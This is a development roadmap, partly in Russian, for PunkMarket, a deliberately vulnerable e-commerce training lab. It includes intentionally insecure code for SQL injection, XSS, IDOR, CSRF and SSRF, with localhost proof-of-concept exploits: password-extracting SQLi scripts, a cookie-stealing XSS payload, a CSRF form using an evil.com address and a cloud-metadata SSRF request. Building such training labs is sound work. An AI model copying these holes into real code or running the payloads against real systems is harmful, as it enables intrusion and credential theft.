# 🚀 PunkMarket — План реализации
## Пошаговая дорожная карта от текущего состояния до полноценной платформы

---

## 📍 Текущее состояние

### ✅ Что уже есть:

1. **Frontend (Next.js/React)**
   - Базовая структура компонентов
   - Header с BackendSelector
   - Product catalog (8 товаров)
   - Categories (10 категорий)
   - X-Ray система (toggle + panel)
   - Routing (/, /category/[id], /product/[id])
   - Стилизация (CSS Modules)

2. **X-Ray Features**
   - Глобальный toggle (вверху справа)
   - Полупрозрачная панель под курсором
   - Отображение backend кода
   - Metadata для ~30 элементов
   - Работает на всех страницах

3. **Mock Data**
   - 8 products (с изображениями)
   - 10 categories
   - X-Ray metadata
   - Базовая структура данных

4. **Infrastructure**
   - Next.js 14 + React 18
   - TypeScript
   - CSS Modules
   - package.json dependencies
   - .gitignore

### ❌ Чего нет:

1. **Backend**
   - Нет реальных API endpoints
   - Нет баз данных
   - Нет auth/session
   - Всё mock'и

2. **Vulnerabilities**
   - Пока 0 реальных уязвимостей
   - Нет exploit'ов
   - Нет PoC scripts

3. **Advanced Features**
   - Нет AI Coach
   - Нет прогресс-трекинга
   - Нет guided challenges
   - Нет writeup templates

---

## 🎯 Стратегия реализации

### Принцип: "Vertical Slices"

Вместо "сначала весь backend, потом все уязвимости":
- Делаем **вертикальные срезы** — законченные фичи end-to-end
- Каждый спринт = 1 компонент + backend + уязвимости + документация

### Пример vertical slice:

```
Sprint 1: "Product Search"
├── Frontend: Search component
├── Backend: /api/v1/products/search endpoint
├── DB: products table
├── Vulnerability: SQLi-01 (union-based)
├── X-Ray: metadata для search
├── Exploit: PoC script
├── Writeup: documented
└── Test: reproducible
```

**Преимущества:**
- ✅ Работающая функциональность после каждого спринта
- ✅ Немедленная обратная связь
- ✅ Можно демонстрировать прогресс
- ✅ Легко pivot при необходимости

---

## 📅 Sprint Plan (8 недель до MVP)

### Week 1-2: Foundation + First Vulnerabilities 🟢

**Цель:** Backend + 5 Easy уязвимостей

#### Sprint 1.1: Products Service (3 дня)

**Задачи:**
1. Setup Node.js Express backend
2. PostgreSQL database (Docker)
3. Products table schema
4. Basic CRUD endpoints

**Deliverables:**
```
✅ GET  /api/v1/products
✅ GET  /api/v1/products/:id
✅ POST /api/v1/products (admin)
✅ Docker compose (postgres + node)
✅ Initial seed data (8 products)
```

**Files to create:**
```
/backend/
├── package.json
├── src/
│   ├── index.js
│   ├── routes/
│   │   └── products.js
│   ├── models/
│   │   └── Product.js
│   └── db/
│       ├── connection.js
│       └── migrations/
│           └── 001_products.sql
├── Dockerfile
└── docker-compose.yml
```

---

#### Sprint 1.2: SQL Injection #1 (Union-based) (2 дня)

**Локация:** `/api/v1/products/search?q=`

**Implementation:**
```javascript
// backend/src/routes/products.js

router.get('/search', async (req, res) => {
  const { q } = req.query;
  
  // INTENTIONALLY VULNERABLE
  const sql = `SELECT * FROM products 
               WHERE name LIKE '%${q}%' 
               OR description LIKE '%${q}%'`;
  
  try {
    const results = await db.query(sql);
    res.json(results.rows);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});
```

**X-Ray Metadata:**
```typescript
// src/data/xray-metadata.ts

export const xrayMetadata = {
  // ...existing...
  
  search_input: {
    id: 'search_input',
    endpoint: {
      method: 'GET',
      path: '/api/v1/products/search',
      version: 'v1'
    },
    service: {
      name: 'Products Service',
      language: 'nodejs',
      framework: 'Express'
    },
    code: {
      handler: `router.get('/search', async (req, res) => {
  const { q } = req.query;
  
  // Search products by name
  const sql = \`SELECT * FROM products 
               WHERE name LIKE '%\${q}%' 
               OR description LIKE '%\${q}%'\`;
  
  const results = await db.query(sql);
  res.json(results.rows);
});`,
      query: `SELECT * FROM products WHERE name LIKE '%[USER_INPUT]%'`,
      validation: 'None'
    },
    flow: 'User input → SQL query → Database → Response',
    author: 'Alex K.',
    lastModified: '2023-05-12'
  }
};
```

**Frontend Integration:**
```tsx
// src/components/Search/Search.tsx

<input
  type="text"
  data-xray-id="search_input"
  placeholder="Search products..."
  onChange={handleSearch}
/>
```

**PoC Script:**
```bash
# exploits/sqli-01-union.sh

#!/bin/bash

TARGET="http://localhost:3000"
PAYLOAD="' UNION SELECT NULL,username,password,NULL,NULL FROM users--"

echo "[*] Testing SQL Injection in search"
echo "[*] Payload: $PAYLOAD"

curl -s "$TARGET/api/v1/products/search?q=$PAYLOAD" | jq .

echo ""
echo "[*] Expected: List of users with passwords"
```

**Writeup:**
```markdown
# SQLi-01: Union-based SQL Injection in Product Search

## Vulnerability Details
- **CWE:** CWE-89
- **OWASP:** A03:2021 – Injection
- **Severity:** Critical
- **Difficulty:** 🟢 Easy

## Description
The product search endpoint directly concatenates user input into SQL query without sanitization.

## Affected Code
`GET /api/v1/products/search?q=[PAYLOAD]`

## Proof of Concept
\`\`\`bash
curl "http://localhost:3000/api/v1/products/search?q=' UNION SELECT NULL,username,password,NULL,NULL FROM users--"
\`\`\`

## Impact
- Database enumeration
- Sensitive data exposure (usernames, passwords)
- Potential for full database compromise

## Remediation
Use parameterized queries:
\`\`\`javascript
const sql = 'SELECT * FROM products WHERE name LIKE $1 OR description LIKE $2';
await db.query(sql, [`%${q}%`, `%${q}%`]);
\`\`\`

## References
- https://portswigger.net/web-security/sql-injection
- https://owasp.org/www-community/attacks/SQL_Injection
```

**Deliverables Sprint 1.2:**
- ✅ Working SQLi vulnerability
- ✅ X-Ray metadata updated
- ✅ PoC script
- ✅ Writeup documentation
- ✅ Test case

---

#### Sprint 1.3: XSS #1 (Reflected in Search) (1 день)

**Frontend Update:**
```tsx
// src/pages/search.tsx

export default function SearchPage() {
  const router = useRouter();
  const query = router.query.q as string;
  
  return (
    <div>
      <h1>Search results for: {query}</h1>
      {/* VULNERABLE */}
      <div dangerouslySetInnerHTML={{__html: query}} />
      
      <ProductGrid products={filteredProducts} />
    </div>
  );
}
```

**PoC:**
```
http://localhost:3000/search?q=<img src=x onerror=alert(document.cookie)>
```

---

#### Sprint 1.4: IDOR #1 (View Any Order) (1 день)

**Backend:**
```javascript
// backend/src/routes/orders.js

router.get('/:id', authenticate, async (req, res) => {
  const { id } = req.params;
  
  // MISSING: ownership check
  const order = await db.query('SELECT * FROM orders WHERE id = $1', [id]);
  
  if (!order.rows[0]) {
    return res.status(404).json({ error: 'Order not found' });
  }
  
  res.json(order.rows[0]);
});
```

---

#### Sprint 1.5: CSRF #1 (Update Profile) (1 день)

**Backend:**
```javascript
router.post('/users/me', authenticate, async (req, res) => {
  const { email, bio } = req.body;
  
  // NO CSRF token check!
  await db.query('UPDATE users SET email = $1, bio = $2 WHERE id = $3', 
    [email, bio, req.user.id]
  );
  
  res.json({ success: true });
});
```

**PoC:**
```html
<!-- exploits/csrf-01.html -->
<form action="http://localhost:3000/api/v3/users/me" method="POST">
  <input name="email" value="attacker@evil.com">
  <input type="submit">
</form>
<script>document.forms[0].submit();</script>
```

---

#### Sprint 1.6: SSRF #1 (Avatar URL) (1 день)

**Backend:**
```javascript
router.post('/users/me', authenticate, async (req, res) => {
  const { avatarUrl } = req.body;
  
  if (avatarUrl) {
    // VULNERABLE: no URL validation
    const response = await fetch(avatarUrl);
    const buffer = await response.buffer();
    fs.writeFileSync(`/uploads/${req.user.id}.jpg`, buffer);
  }
  
  await db.query('UPDATE users SET avatar_url = $1 WHERE id = $2', 
    [avatarUrl, req.user.id]
  );
  
  res.json({ success: true });
});
```

**PoC:**
```bash
curl -X POST http://localhost:3000/api/v3/users/me \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"avatarUrl": "http://169.254.169.254/latest/meta-data/"}'
```

---

### Week 1-2 Summary

**Deliverables:**
- ✅ Backend foundation (Node.js + PostgreSQL)
- ✅ Docker setup
- ✅ 5 Easy vulnerabilities working
- ✅ X-Ray metadata для всех 5
- ✅ 5 PoC scripts
- ✅ 5 Writeups
- ✅ Integration tests

**Stats:**
- Lines of code: ~2000
- Endpoints: 10+
- Vulnerabilities: 5
- Coverage: 10% of target (5/50)

---

### Week 3-4: Medium Vulnerabilities 🟡

**Цель:** 10 Medium уязвимостей + User Auth

#### Sprint 2.1: User Authentication (2 дня)

**Features:**
- JWT-based auth
- Registration
- Login
- Session management
- Password hashing (bcrypt)

**Endpoints:**
```
POST /api/v3/auth/register
POST /api/v3/auth/login
POST /api/v3/auth/logout
GET  /api/v3/users/me
PUT  /api/v3/users/me
```

**Vulnerabilities to embed:**
- AUTH-01: JWT alg=none
- AUTH-02: Session fixation
- AUTH-03: Predictable password reset token

---

#### Sprint 2.2: Blind SQL Injection (2 дня)

**Implementation:**
- SQLi-03: Boolean blind в reviews filter
- SQLi-04: Time-based blind в orders filter

**PoC Scripts:**
```python
# exploits/sqli-03-boolean-blind.py

import requests
import string

TARGET = "http://localhost:3000/api/v1/reviews/user/123"

def check_char(position, char):
    payload = f"?sort=rating DESC, (SELECT CASE WHEN (SELECT SUBSTRING(password,{position},1) FROM users WHERE username='admin')='{char}' THEN rating ELSE id END)"
    
    r = requests.get(TARGET + payload)
    # If response different → char is correct
    return len(r.text) > 1000

password = ""
for pos in range(1, 20):
    for char in string.ascii_lowercase + string.digits:
        if check_char(pos, char):
            password += char
            print(f"[+] Found: {password}")
            break

print(f"[*] Password: {password}")
```

---

#### Sprint 2.3: DOM-based XSS (2 дня)

**Implementation:**
- XSS-07: Category filter (innerHTML)
- XSS-08: Autocomplete (React setState)

**Testing:**
```javascript
// exploits/xss-07-dom.js

// Vulnerable code
document.getElementById('category-name').innerHTML = params.get('category');

// Exploit
http://localhost:3000/catalog#category=<img src=x onerror=alert(1)>
```

---

#### Sprint 2.4: IDOR + UUID (2 дня)

**Implementation:**
- IDOR-04: Draft products
- IDOR-05: Invoice PDF (predictable UUID)

**UUID v1 Generation:**
```javascript
const { v1: uuidv1 } = require('uuid');

// Generate predictable UUID
const uuid = uuidv1();  // Based on timestamp
```

---

#### Sprint 2.5: Business Logic Flaws (2 дня)

**Implementation:**
- BL-01: Infinite promo reuse
- BL-02: Negative price
- BL-03: Overselling

**Testing:**
```bash
# Test overselling
for i in {1..10}; do
  curl -X POST http://localhost:3000/api/v2/orders \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"items":[{"productId":1,"quantity":5}]}' &
done
wait
```

---

### Week 3-4 Summary

**Deliverables:**
- ✅ User authentication system
- ✅ 10 Medium vulnerabilities
- ✅ Advanced PoC scripts (Python/JS)
- ✅ X-Ray coverage +30 elements
- ✅ Writeups for all

**Stats:**
- Lines of code: ~5000
- Endpoints: 25+
- Vulnerabilities: 15 (5 Easy + 10 Medium)
- Coverage: 30% (15/50)

---

### Week 5-6: Hard Vulnerabilities 🔴

**Цель:** 10 Hard уязвимостей + Advanced features

#### Sprint 3.1: Advanced SQLi (3 дня)

**Implementation:**
- SQLi-05: Second-order
- SQLi-06: Stacked queries
- SQLi-07: JSON field injection

---

#### Sprint 3.2: XXE + Deserialization (3 дня)

**Implementation:**
- XXE-01: Review XML submission
- XXE-02: SOAP legacy
- DESER-01: Session cookie
- DESER-02: Redis cache

---

#### Sprint 3.3: Race Conditions (2 дня)

**Implementation:**
- RACE-01: Stock decrement
- RACE-02: Double refund
- RACE-03: Promo concurrent use

**Testing Framework:**
```python
# exploits/race-test.py

import asyncio
import httpx

async def race_attack(client, url, data):
    tasks = [client.post(url, json=data) for _ in range(10)]
    return await asyncio.gather(*tasks)

async def main():
    async with httpx.AsyncClient() as client:
        results = await race_attack(
            client,
            'http://localhost:3000/api/v2/orders/123/refund',
            {}
        )
        print(f"Successful refunds: {sum(1 for r in results if r.status_code == 200)}")

asyncio.run(main())
```

---

#### Sprint 3.4: SSRF Chains (2 дня)

**Implementation:**
- SSRF-04: DNS rebinding
- SSRF-05: GraphQL price fetcher
- SSRF-06: PDF generator → RCE

---

### Week 5-6 Summary

**Deliverables:**
- ✅ 10 Hard vulnerabilities
- ✅ Advanced exploitation scripts
- ✅ Race condition testing framework
- ✅ Chain attack documentation

**Stats:**
- Lines of code: ~8000
- Vulnerabilities: 25 (5 Easy + 10 Medium + 10 Hard)
- Coverage: 50% (25/50)

---

### Week 7-8: Expert + Platform Features 🔴

**Цель:** Expert уязвимости + AI Coach + Challenges

#### Sprint 4.1: Expert Vulnerabilities (4 дня)

**Implementation:**
- SQLi-07: JSON field injection
- XSS-10: GraphQL error
- IDOR-08: GraphQL batching
- CSRF-05: JSON request bypass
- DESER-03: Java serialized
- SSTI-02: Jinja2 error pages
- ADV-01: Cache poisoning
- ADV-02: Request smuggling
- ADV-03: Prototype pollution

---

#### Sprint 4.2: AI Coach Integration (2 дня)

**Features:**
- GPT-4 integration
- Context-aware hints
- Code review suggestions
- Exploit guidance

**Implementation:**
```typescript
// src/components/AICoach/AICoach.tsx

const AICoach = () => {
  const [messages, setMessages] = useState([]);
  
  const askAI = async (question: string, context: XRayContext) => {
    const response = await fetch('/api/ai/chat', {
      method: 'POST',
      body: JSON.stringify({
        question,
        code: context.code,
        vulnerability_type: context.type
      })
    });
    
    const { answer } = await response.json();
    setMessages([...messages, { role: 'assistant', content: answer }]);
  };
  
  // ...
};
```

---

#### Sprint 4.3: Guided Challenges (2 дня)

**Structure:**
```typescript
interface Challenge {
  id: string;
  title: string;
  difficulty: 'easy' | 'medium' | 'hard' | 'expert';
  vulnerability_type: string;
  hints: Hint[];
  steps: Step[];
  success_criteria: string;
}

const challenges: Challenge[] = [
  {
    id: 'sqli-01',
    title: 'Product Search SQL Injection',
    difficulty: 'easy',
    vulnerability_type: 'sql_injection',
    hints: [
      {
        level: 1,
        text: 'Look at the X-Ray code. How is user input handled?'
      },
      {
        level: 2,
        text: 'Try adding a single quote to your search query. What happens?'
      },
      {
        level: 3,
        text: 'UNION SELECT can help you extract data from other tables'
      }
    ],
    steps: [
      'Find the vulnerable search input',
      'Test for SQL injection with single quote',
      'Use UNION SELECT to extract user data',
      'Submit the exploit with users table data'
    ],
    success_criteria: 'Extract at least 3 user records including passwords'
  }
];
```

---

### Week 7-8 Summary

**Final MVP Deliverables:**
- ✅ 50+ vulnerabilities (all difficulty levels)
- ✅ Full backend stack (Node.js, PostgreSQL, Redis)
- ✅ AI Coach integration
- ✅ 20+ Guided challenges
- ✅ 50+ PoC scripts
- ✅ 50+ Writeups
- ✅ X-Ray coverage 100+ elements
- ✅ Progress tracking system
- ✅ Docker deployment

**Stats:**
- Lines of code: ~15,000
- Endpoints: 50+
- Vulnerabilities: 50+
- Challenges: 20+
- Writeups: 50+
- X-Ray metadata: 100+

---

## 📊 Post-MVP Roadmap (Week 9-24)

### Phase 2: Expand & Polish (Week 9-12)

**Goals:**
- Add 30 more vulnerabilities (total 80)
- GraphQL API
- WebSocket features
- Mobile-responsive UI
- Video tutorials

---

### Phase 3: Multi-Language Backend (Week 13-16)

**Goals:**
- Python FastAPI (Orders Service)
- Java Spring Boot (Reviews Service)
- PHP legacy endpoint
- Polyglot exploitation

---

### Phase 4: Advanced Features (Week 17-20)

**Goals:**
- Multi-step attack chains
- Automated exploit generation
- Real-time collaboration
- Leaderboard
- Capture The Flag mode

---

### Phase 5: Integration & Production (Week 21-24)

**Goals:**
- Punkration platform integration
- LMS features
- Grading system
- Certificate generation
- Production deployment

---

## 🎯 Success Metrics

### Week 2 Checkpoint:
- [ ] 5 vulnerabilities working
- [ ] Backend functional
- [ ] Docker deployment
- [ ] Demo-ready

### Week 4 Checkpoint:
- [ ] 15 vulnerabilities
- [ ] Auth system
- [ ] 15 writeups
- [ ] Public demo

### Week 6 Checkpoint:
- [ ] 25 vulnerabilities
- [ ] Advanced exploits
- [ ] Race condition framework
- [ ] Alpha testing

### Week 8 Checkpoint (MVP):
- [ ] 50 vulnerabilities
- [ ] AI Coach live
- [ ] 20 challenges
- [ ] Beta launch

---

## 🛠️ Development Setup

### Prerequisites:
```bash
- Node.js 18+
- PostgreSQL 14+
- Redis 7+
- Docker & Docker Compose
- Git
```

### Quick Start:
```bash
# Clone repo
git clone https://github.com/punkration/punkmarket.git
cd punkmarket

# Install dependencies
npm install
cd backend && npm install

# Start infrastructure
docker-compose up -d

# Run migrations
npm run migrate

# Seed data
npm run seed

# Start backend
cd backend && npm run dev

# Start frontend
npm run dev
```

---

## 📝 Daily Workflow

### Morning:
1. Check progress tracker
2. Review yesterday's work
3. Plan today's tasks (use TODOs)
4. Update documentation

### Development:
1. Create feature branch
2. Implement vertical slice
3. Write tests
4. Create PoC script
5. Document vulnerability
6. Update X-Ray metadata

### Evening:
1. Run all tests
2. Update progress tracker
3. Commit & push
4. Write daily summary
5. Plan tomorrow

---

## 🔄 Quality Checklist

### For Each Vulnerability:
- [ ] Vulnerability works in browser
- [ ] PoC script executes successfully
- [ ] Writeup is complete and clear
- [ ] X-Ray metadata added
- [ ] Test case written
- [ ] Impact documented
- [ ] Remediation provided
- [ ] References included

### For Each Sprint:
- [ ] All tasks completed
- [ ] Code reviewed
- [ ] Tests passing
- [ ] Documentation updated
- [ ] Demo prepared
- [ ] Retrospective done

---

## 🎓 Learning Resources

### For Development:
- OWASP Top 10
- PortSwigger Academy
- PSDP Documentation
- Bug Bounty Writeups

### For Testing:
- Burp Suite docs
- SQLmap documentation
- OWASP Testing Guide
- HackerOne reports

---

## 🚀 Next Steps (Immediate)

### Tomorrow (Day 1):

**Morning:**
1. ✅ Review architecture docs
2. ⏳ Create backend project structure
3. ⏳ Setup PostgreSQL Docker
4. ⏳ Create products table

**Afternoon:**
5. ⏳ Implement GET /api/v1/products
6. ⏳ Implement GET /api/v1/products/:id
7. ⏳ Seed initial data
8. ⏳ Test endpoints with Postman

**Evening:**
9. ⏳ Connect frontend to backend API
10. ⏳ Document progress
11. ⏳ Plan Day 2

---

### This Week (Week 1):

**Day 2:** Search endpoint + SQLi-01
**Day 3:** XSS-01 + IDOR-01
**Day 4:** CSRF-01 + SSRF-01
**Day 5:** Testing + Documentation
**Day 6-7:** Buffer/Refactoring

---

## 📞 Support & Communication

### Daily Updates:
- Post progress in #punkmarket channel
- Share screenshots/demos
- Ask questions early
- Celebrate wins

### Weekly Review:
- Demo working features
- Discuss blockers
- Plan next week
- Update roadmap

---

## 🎯 Vision Statement

> "By Week 8, PunkMarket will be a fully functional, realistic e-commerce platform with 50+ exploitable vulnerabilities, serving as the premier hands-on training ground for aspiring AppSec professionals and bug bounty hunters."

**Let's make it happen! 🚀**

---

**Version:** 1.0  
**Last Updated:** 2025-11-28  
**Status:** 🟢 Ready to Start  
**Next Milestone:** Week 2 (5 vulnerabilities)
